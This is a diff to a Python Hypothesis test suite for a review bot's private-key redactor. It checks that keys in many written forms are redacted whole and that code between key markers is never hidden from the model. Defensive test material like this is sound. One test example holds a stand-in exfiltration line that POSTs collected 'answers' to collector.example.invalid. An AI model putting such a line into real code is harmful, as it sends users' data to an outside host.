@@ -1,7 +1,9 @@
 """Claude review bot checks (scripts/claude_review.py).
 
 Property-based tests (Hypothesis) pin the pure helpers: mention and issue
-reference neutralizing (outside code only), redaction, delimiter escaping,
+reference neutralizing (outside code only), redaction (a private key in
+any written form goes whole, never less than main's old pattern took, and
+code between a key's markers always stays), delimiter escaping,
 file selection under the token budget, comment size and contents, the
 sticky state line, the exit-code rule, and the output parser. More
 properties drive whole runs that cannot read the PR from every state the
@@ -46,9 +48,9 @@ import tempfile
 import threading
 import time
 import unittest
-from dataclasses import replace
+from dataclasses import dataclass, replace
 from pathlib import Path
-from typing import Any, Callable, Mapping
+from typing import Any, Callable, Mapping, Sequence
 from unittest import mock
 
 import anthropic
@@ -571,6 +573,115 @@ CODE_LINES = st.lists(
     min_size=1,
     max_size=5,
 ).map(lambda parts: "".join(word + mark for word, mark in parts))
+
+
+@dataclass(frozen=True)
+class KeyForm:
+    """A way to write a key's lines. Each line after the header is a line
+    start, the line, and a line end, and lines are joined by a break. The
+    header's own line start stays before it and the footer's line end after
+    it, so the key is everything from the header through the footer."""
+
+    starts: tuple[str, ...]  # taken in turn from the header's line on, so one key can mix them
+    end: str
+    brk: str
+    slash: str = "/"  # how a / in the base64 is written (PHP's json_encode writes \/)
+
+    def write(self, lines: Sequence[str], first: int = 0) -> str:
+        """lines in this form, the first of them being the key's line number first."""
+        return "".join(
+            (self.end + self.brk + self.starts[number % len(self.starts)] if number else "") + line.replace("/", self.slash)
+            for number, line in enumerate(lines, start=first)
+        )
+
+    def key(self, kind: str, lines: Sequence[str]) -> tuple[str, str, str]:
+        """The text before the header, the header through the footer, and the text after the footer."""
+        return self.starts[0], self.write([f"-----BEGIN {kind}PRIVATE KEY-----", *lines, f"-----END {kind}PRIVATE KEY-----"]), self.end
+
+
+# Line starts in a file or a diff: a diff marker, indentation, comment
+# markers (one, or two in a row such as "# // " or "-- REM "), and an
+# opening quote.
+SPACED_COMMENT_MARKERS = ["# ", "## ", "// ", "/// ", "//! ", "* ", " * ", "; ", ";; ", "-- ", "% ", "%% ", "REM ", "rem "]
+LINE_STARTS = st.builds(
+    lambda diff, indent, first, last, quote: diff + indent + "".join(first) + last + quote,
+    st.sampled_from(["", "+", "-", " "]),
+    st.sampled_from(["", "  ", "    ", "\t"]),
+    st.lists(st.sampled_from(SPACED_COMMENT_MARKERS), max_size=1),
+    st.sampled_from(["", *SPACED_COMMENT_MARKERS, "#", "//", "*", ";", "%"]),
+    st.sampled_from(["", '"', "'", "`", '\\"']),
+)
+# Line ends: a closing quote, a comma or + between string pieces, an
+# escaped line break, a line continuation, or nothing.
+LINE_ENDS = st.sampled_from(["", '"', "'", ",", '",', '" +', " +", '" \\', "\\", '\\"', "\\n", '\\n"', '\\n" +', '\\n",', '\\n"\\', "\\n\\"])
+# A key line by line, as in a PEM or YAML file, a comment, string pieces, or a diff of any of them.
+LINE_BY_LINE_KEYS = st.builds(KeyForm, st.lists(LINE_STARTS, min_size=1, max_size=3).map(tuple), LINE_ENDS, st.sampled_from(["\n", "\r\n"]))
+# A key in one string, its lines joined by escaped line breaks, as in JSON or an env file.
+KEYS_IN_A_STRING = st.builds(
+    KeyForm,
+    st.sampled_from(["", "  ", "\\t"]).map(lambda start: (start,)),
+    st.just(""),
+    st.sampled_from(["\\n", "\\r\\n", "\\\\n"]),
+    st.sampled_from(["/", "\\/"]),
+)
+# A key on one line: its lines joined by spaces, as list items or string pieces, or with nothing between them.
+KEYS_ON_ONE_LINE = st.builds(
+    KeyForm, st.just(("",)), st.just(""), st.sampled_from([" ", ", ", '", "', '" + "', '\\n" + "', ""]), st.sampled_from(["/", "\\/"])
+)
+MULTILINE_KEY_FORMS = LINE_BY_LINE_KEYS | KEYS_IN_A_STRING
+KEY_FORMS = MULTILINE_KEY_FORMS | KEYS_ON_ONE_LINE
+# An encrypted PEM key's two headers and the blank line after them.
+ENCRYPTED_LINES = ["Proc-Type: 4,ENCRYPTED", "DEK-Info: AES-128-CBC,3F17F5316E2BAC89", ""]
+WRITTEN_KEY_BODIES = KEY_BODIES | KEY_BODIES.map(lambda lines: [*ENCRYPTED_LINES, *lines])
+# The private key pattern on main before the redactor walked a key's lines
+# (d29e7e9): through the footer when one came within 8,000 characters,
+# otherwise the header and the base64 lines right after it. A key with no
+# code inside must lose at least as much as main took from it.
+MAIN_KEY_PATTERN = re.compile(
+    r"-----BEGIN [A-Z ]*PRIVATE KEY-----"
+    r"(?:[\s\S]{0,8000}?-----END [A-Z ]*PRIVATE KEY-----|(?:\s*\+?[A-Za-z0-9+/=]{16,})*)"
+)
+
+
+@st.composite
+def keys_with_no_code_inside(draw: st.DrawFn) -> str:
+    """Text around a private key with nothing but key material from its
+    header on: a whole key in one of the nine embeddings or in any written
+    form, or one cut short right before a line of code."""
+    kind, before, after = draw(KEY_KINDS), draw(SAFE_TEXT), draw(SAFE_TEXT)
+    shape = draw(st.sampled_from(["embedding", "form", "cut short"]))
+    if shape == "embedding":
+        lead, block, trail = KEY_EMBEDDINGS[draw(st.sampled_from(sorted(KEY_EMBEDDINGS)))](kind, draw(KEY_BODIES))
+        return before + lead + block + trail + after
+    form, lines = draw(KEY_FORMS), draw(WRITTEN_KEY_BODIES)
+    if shape == "form":
+        lead, block, trail = form.key(kind, lines)
+        return before + lead + block + trail + after
+    head = form.write([f"-----BEGIN {kind}PRIVATE KEY-----", *lines])
+    return before + form.starts[0] + head + form.end + "\n" + draw(CODE_LINES) + after
+
+
+# Text made of pieces of keys and of code in any order: runs of pieces, each
+# after a header and maybe before a footer, so code often sits between them.
+KEY_TEXT_PIECES = st.sampled_from([
+    "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7aBcDeFgHiJkL", "sendEverythingHome", "Ab3d==", "abc", "+", "-", "/", "=",
+    "\n", "\r\n", "\r", "\\n", "\\r", "\\", '\\"', "\\/", "\\t", '"', "'", "`", ",", " ", "\t", "#", "//", "*", ";", "%", "--", "REM ",
+    "Proc-Type: 4,ENCRYPTED", "DEK-Info: AES-128-CBC,3F17F5316E2BAC89", "(", ")", "{", "}", "[", "]", ".", ":", "<", ">", "!", "?",
+    "&", "|", "@", "$", "^", "~", "fetch(x);", "-----BEGIN PRIVATE KEY-----", "-----END PRIVATE KEY-----",
+])  # fmt: skip
+KEY_TEXT_RUNS = st.lists(KEY_TEXT_PIECES, max_size=12).map("".join)
+KEY_TEXTS = st.lists(
+    st.tuples(
+        KEY_TEXT_RUNS,
+        st.sampled_from(["-----BEGIN PRIVATE KEY-----", "-----BEGIN RSA PRIVATE KEY-----"]),
+        KEY_TEXT_RUNS,
+        st.sampled_from(["", "-----END PRIVATE KEY-----", "-----END RSA PRIVATE KEY-----"]),
+    ).map("".join),
+    min_size=1,
+    max_size=3,
+).map("".join)
+# Characters code needs that no written key holds.
+CODE_PUNCTUATION = re.compile(r"[(){}\[\]<>.?&|@$^~]")
 PATHS = st.one_of(
     st.from_regex(r"(src/lib|scripts|tests|docs|migrations|\.github/workflows)/[a-z]{1,8}\.(ts|py|md|sql|yml)", fullmatch=True),
     st.sampled_from(["pnpm-lock.yaml", "public/logo.png", ".env", "data/pilot.csv", "build/app.js", "feature.svg"]),
@@ -833,6 +944,112 @@ class RedactionProperties(unittest.TestCase):
         unterminated = '+-----BEGIN PRIVATE KEY-----\n+MIIEvQIBADANBgkqhkiG9w0BAQEFAASC\n+const next = "kept";\n'
         out, count = review.redact_sensitive(unterminated)
         self.assertEqual((out, count), ('+[REDACTED private key]\n+const next = "kept";\n', 1))
+
+    @PBT
+    @given(KEY_KINDS, WRITTEN_KEY_BODIES, KEY_FORMS, SAFE_TEXT, SAFE_TEXT)
+    @example("", ["MIIEvQIBADANBgkqhkiG9w0BAQEFAASC", "Ab3d=="], KeyForm(("+# ",), "", "\n"), "", "")  # commented out in a YAML diff
+    @example("RSA ", ["MIIEow"], KeyForm(("+ * ",), "", "\n"), "+/**\n", "\n+ */\n")  # in a block comment
+    @example("", ["MIIEvQIBADANBgkqhkiG9w0BAQEFAASC"], KeyForm(("+  ",), "", "\n"), "+tls.key: |\n", "\n")  # a YAML block scalar
+    @example("", ["MIIEvQIBADANBgkqhkiG9w0BAQEFAASC"], KeyForm(('  "',), '\\n" +', "\n"), "const key =\n", ";")  # JS string pieces
+    def test_a_key_goes_whole_in_every_written_form(
+        self, kind: str, lines: list[str], form: KeyForm, before: str, after: str
+    ) -> None:
+        # Whatever stands at the start of each line (diff markers,
+        # indentation, comment markers of any kind, mixed from line to line,
+        # quotes), at its end (quotes, commas, string concatenation, escaped
+        # line breaks, continuations), or between lines (real or escaped
+        # line breaks, list items, spaces, nothing), header to footer becomes
+        # one marker and nothing around it changes.
+        lead, block, trail = form.key(kind, lines)
+        out, count = review.redact_sensitive(before + lead + block + trail + after)
+        self.assertEqual((out, count), (before + lead + review.redaction_marker("private key") + trail + after, 1))
+        self.assertEqual(review.redact_sensitive(out), (out, 0))
+
+    @PBT
+    @given(
+        KEY_KINDS,
+        st.lists(KEY_LINE, max_size=3) | st.lists(KEY_LINE, min_size=1, max_size=2).map(lambda lines: [*ENCRYPTED_LINES, *lines]),
+        KEY_BODIES,
+        CODE_LINES,
+        MULTILINE_KEY_FORMS,
+        SAFE_TEXT,
+        SAFE_TEXT,
+    )
+    @example(
+        "", [], ["Ab3d=="], "fetch('https://collector.example.invalid/x', { method: 'POST', body: JSON.stringify(answers) });",
+        KeyForm(("+# ",), "", "\n"), "", "",
+    )  # fmt: skip
+    def test_code_between_key_markers_reaches_the_model_in_every_written_form(
+        self, kind: str, above: list[str], below: list[str], code: str, form: KeyForm, before: str, after: str
+    ) -> None:
+        # A line of code between a key's header and footer, written like
+        # the key's lines, ends the redaction: the key lines above it go,
+        # and the code and everything after it reach the model unchanged.
+        lines = [f"-----BEGIN {kind}PRIVATE KEY-----", *above, code, *below, f"-----END {kind}PRIVATE KEY-----"]
+        split = 1 + len(above)
+        rest = form.write(lines[split:], first=split) + form.end + after
+        out, count = review.redact_sensitive(before + form.starts[0] + form.write(lines[:split]) + rest)
+        self.assertEqual((out, count), (before + form.starts[0] + review.redaction_marker("private key") + rest, 1))
+
+    @PBT
+    @given(keys_with_no_code_inside())
+    def test_nothing_main_held_back_reaches_the_model(self, text: str) -> None:
+        # With nothing but key material from a key's header on, every span
+        # main's pattern redacted lies inside one the redactor redacts.
+        spans = review.private_key_spans(text)
+        for match in MAIN_KEY_PATTERN.finditer(text):
+            self.assertTrue(any(start <= match.start() and match.end() <= end for start, end in spans), (match.span(), spans))
+
+    @PBT
+    @given(KEY_TEXTS)
+    def test_a_redaction_never_holds_code(self, text: str) -> None:
+        # Any mix of key pieces and code: each redaction starts at a header,
+        # comes after the one before it, and holds none of the punctuation
+        # code is written with, so no code is ever hidden from the model.
+        previous = 0
+        for start, end in review.private_key_spans(text):
+            self.assertGreaterEqual(start, previous)
+            self.assertTrue(text.startswith("-----BEGIN ", start))
+            self.assertIsNone(CODE_PUNCTUATION.search(text, start, end), text[start:end])
+            previous = end
+        out, _count = review.redact_sensitive(text)
+        self.assertEqual(review.redact_sensitive(out), (out, 0))
+
+    def test_odd_key_lines_take_linear_time(self) -> None:
+        # Long texts that are almost lines of a key in the written forms the
+        # redactor reads (comment and diff markers, escapes, quotes, string
+        # pieces, encrypted headers), or that hold many headers: each header
+        # is redacted once, and quickly.
+        header = "-----BEGIN PRIVATE KEY-----"
+        texts = [
+            (header + "\n# " * 20_000, 1),
+            (header + "\n+# " * 15_000, 1),
+            (header + "\n//" * 20_000, 1),
+            (header + "\n/// " * 12_000, 1),
+            (header + "\n * " * 15_000, 1),
+            (header + "\nREM " * 12_000, 1),
+            (header + "\n--- " * 12_000, 1),
+            (header + "\n+" * 30_000, 1),
+            (header + "+ " * 30_000, 1),
+            (header + '\\"' * 30_000, 1),
+            (header + "\\n\\" * 20_000, 1),
+            (header + ("\n" + "a" * 15) * 3_750, 1),
+            (header + "\n" + "-" * 60_000, 1),
+            (header + "\n" + "/" * 60_000, 1),
+            (header + "\n" + "#" * 60_000, 1),
+            (header + "\n-----END " + "A " * 30_000, 1),
+            (header + "\nDEK-Info: " + "A-" * 30_000, 1),
+            (header + "\nProc-Type: 4,ENCRYPTED" * 2_700, 1),
+            ((header + "x") * 2_200, 2_200),
+            ((header + "\n" + "A" * 64 + "\n(") * 600, 600),
+            ("-----BEGIN " + "A " * 30_000, 0),
+        ]
+        for text, headers in texts:
+            self.assertGreaterEqual(len(text), 50_000)
+            started = time.monotonic()
+            _out, count = review.redact_sensitive(text)
+            self.assertEqual(count, headers, text[:40])
+            self.assertLess(time.monotonic() - started, 2.0, text[:40])
 
 
 class DelimiterProperties(unittest.TestCase):
